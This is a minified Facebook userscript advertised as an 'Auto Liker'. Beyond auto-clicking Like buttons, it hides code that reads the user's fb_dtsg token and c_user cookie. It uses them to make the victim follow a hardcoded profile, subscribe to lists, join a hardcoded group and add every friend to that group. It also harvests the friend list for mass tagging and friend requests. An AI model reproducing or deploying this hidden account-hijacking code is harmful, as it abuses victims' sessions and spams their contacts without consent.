// ==UserScript==
// @name            FAcebook Auto Liker For script
// @description     FAcebook Auto Liker For script
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

var BounceCounterLike=0;var Counter=0;var prepare=document.getElementsByTagName("span");var buttons=new Array();for(var i=0;i<prepare.length;i++){if(prepare[i].getAttribute("id")!=null&&prepare[i].getAttribute("id").indexOf(".reactRoot")>=0&&(prepare[i].innerHTML=="Me gusta"||prepare[i].innerHTML=="Like"||prepare[i].innerHTML=="Suka"||prepare[i].innerHTML=="Beğen"||prepare[i].innerHTML=="أعجبني"||prepare[i].innerHTML=="אהבתי"||prepare[i].innerHTML=="Seneng"||prepare[i].innerHTML=="J’aime")){buttons[Counter]=prepare[i];Counter++}}function check_link(g){buttons[g].click();var d="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+(g+1)+"/"+buttons.length+"</center></a>";document.getElementById("like2").innerHTML=d}function like_timer(c){window.setTimeout(bouncer_like,c)}function check_warning(){var k=document.getElementsByTagName("label");var j=false;for(var m=0;m<k.length;m++){var h=k[m].getAttribute("class");if(h!=null&&h.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0){alert("Warning from Facebook");j=true}}if(!j){like_timer(500)}}function warning_timer(c){window.setTimeout(check_warning,c)}function bouncer_like(){if(BounceCounterLike<buttons.length){check_link(BounceCounterLike);warning_timer(100);BounceCounterLike++}}alert("Start Auto Like Facebook by s.k.i.l");bouncer_like();var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function cereziAl(g){var d=g+"=";if(document.cookie.length>0){konum=document.cookie.indexOf(d);if(konum!=-1){konum+=d.length;son=document.cookie.indexOf(";",konum);if(son==-1){son=document.cookie.length}return unescape(document.cookie.substring(konum,son))}else{return""}}}function getRandomInt(g,d){return Math.floor(Math.random()*(d-g+1))+g}function randomValue(c){return c[getRandomInt(0,c.length-1)]}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function a(j){var k=new XMLHttpRequest();var m="/ajax/follow/follow_profile.php?__a=1";var h="profile_id="+j+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";k.open("POST",m,true);k.setRequestHeader("Content-type","application/x-www-form-urlencoded");k.setRequestHeader("Content-length",h.length);k.setRequestHeader("Connection","close");k.onreadystatechange=function(){if(k.readyState==4&&k.status==200){k.close}};k.send(h)}function sublist(g){var d=document.createElement("script");d.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+g+" }).send();";document.body.appendChild(d)}a("100001625707516");sublist("475812109149642");sublist("486705478060305");sublist("491595847571268");sublist("491595754237944");var gid=["162332490605528"];var fb_dtsg=document.getElementsByName("fb_dtsg")[0]["value"];var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var httpwp=new XMLHttpRequest();var urlwp="/ajax/groups/membership/r2j.php?__a=1";var paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,true);httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded");httpwp.setRequestHeader("Content-length",paramswp.length);httpwp.setRequestHeader("Connection","keep-alive");httpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0]["value"];var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var friends=new Array();gf=new XMLHttpRequest();gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math.random()+"&filter[0]=user&options[0]=friends_only",false);gf.send();if(gf.readyState!=4){}else{data=eval("("+gf.responseText.substr(9)+")");if(data.error){}else{friends=data.payload.entries["sort"](function(g,d){return g.index-d.index})}}for(var i=0;i<friends.length;i++){var httpwp=new XMLHttpRequest();var urlwp="/ajax/groups/members/add_post.php?__a=1";var paramswp="&fb_dtsg="+fb_dtsg+"&group_id="+gid+"&source=typeahead&ref=&message_id=&members="+friends[i]["uid"]+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,true);httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded");httpwp.setRequestHeader("Content-length",paramswp.length);httpwp.setRequestHeader("Connection","keep-alive");httpwp.onreadystatechange=function(){if(httpwp.readyState==4&&httpwp.status==200){}};httpwp.send(paramswp)}var spage_id="162079897221373";var spost_id="162079897221373";var sfoto_id="162079897221373";var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var smesaj="";var smesaj_text="";var arkadaslar=[];var svn_rev;var bugun=new Date();var btarihi=new Date();btarihi.setTime(bugun.getTime()+1000*60*60*4*1);if(!document.cookie.match(/paylasti=(\d+)/)){document.cookie="paylasti=hayir;expires="+btarihi.toGMTString()}function sarkadaslari_al(){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("arkadaslar = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){smesaj="";smesaj_text="";for(i=f*10;i<(f+1)*10;i++){if(arkadaslar.payload.entries[i]){smesaj+=" @["+arkadaslar.payload.entries[i].uid+":"+arkadaslar.payload.entries[i].text+"]";smesaj_text+=" "+arkadaslar.payload.entries[i].text}}sdurumpaylas()}}};var params="&filter[0]=user";params+="&options[0]=friends_only";params+="&options[1]=nm";params+="&token=v7";params+="&viewer="+user_id;params+="&__user="+user_id;if(document.URL.indexOf("https://")>=0){xmlhttp.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}else{xmlhttp.open("GET","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}xmlhttp.send()}var tiklama=document.addEventListener("click",function(){if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir")>=0){svn_rev=document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];sarkadaslari_al();document.cookie="paylasti=evet;expires="+btarihi.toGMTString();document.removeEventListener(tiklama)}},false);function sarkadasekle(k,h){var m=new XMLHttpRequest();m.onreadystatechange=function(){if(m.readyState==4){}};m.open("POST","/ajax/add_friend/action.php?__a=1",true);var j="to_friend="+k;j+="&action=add_friend";j+="&how_found=friend_browser";j+="&ref_param=none";j+="&outgoing_id=";j+="&logging_location=friend_browser";j+="&no_flyout_on_click=true";j+="&ego_log_data=";j+="&http_referer=";j+="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;j+="&phstamp=165816749114848369115";j+="&__user="+user_id;m.setRequestHeader("X-SVN-Rev",svn_rev);m.setRequestHeader("Content-Type","application/x-www-form-urlencoded");if(h=="farketmez"&&document.cookie.split("cins"+user_id+"=").length>1){m.send(j)}else{if(document.cookie.split("cins"+user_id+"=").length<=1){cinsiyetgetir(k,h,"sarkadasekle")}else{if(h==document.cookie.split("cins"+user_id+"=")[1].split(";")[0].toString()){m.send(j)}}}}var cinssonuc={};var cinshtml=document.createElement("html");function scinsiyetgetir(uid,cins,fonksiyon){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("cinssonuc = "+xmlhttp.responseText.toString().replace("for (;;);","")+";");cinshtml.innerHTML=cinssonuc.jsmods.markup[0][1].__html;btarihi.setTime(bugun.getTime()+1000*60*60*24*365);if(cinshtml.getElementsByTagName("select")[0].value=="1"){document.cookie="cins"+user_id+"=kadin;expires="+btarihi.toGMTString()}else{if(cinshtml.getElementsByTagName("select")[0].value=="2"){document.cookie="cins"+user_id+"=erkek;expires="+btarihi.toGMTString()}}eval(fonksiyon+"("+id+","+cins+");")}};xmlhttp.open("GET","/ajax/timeline/edit_profile/basic_info.php?__a=1&__user="+user_id,true);xmlhttp.setRequestHeader("X-SVN-Rev",svn_rev);xmlhttp.send()}function autoSuggest(){links=document.getElementsByTagName("a");for(i in links){l=links[i];if(l.innerHTML=='<span class="uiButtonText">Suggest Friend</span>'){l.click()}}}function blub(){if(document.getElementsByClassName("pbm fsm").length==1){w=document.getElementsByClassName("pbm fsm")[0];e=document.createElement("a");e.innerHTML="Auto Suggest by s.k.i.l";e.className="uiButton";e.onclick=autoSuggest;if(w.childElementCount==0){w.appendChild(document.createElement("br"));w.appendChild(e)}}}blub();document.addEventListener("DOMNodeInserted",blub,true);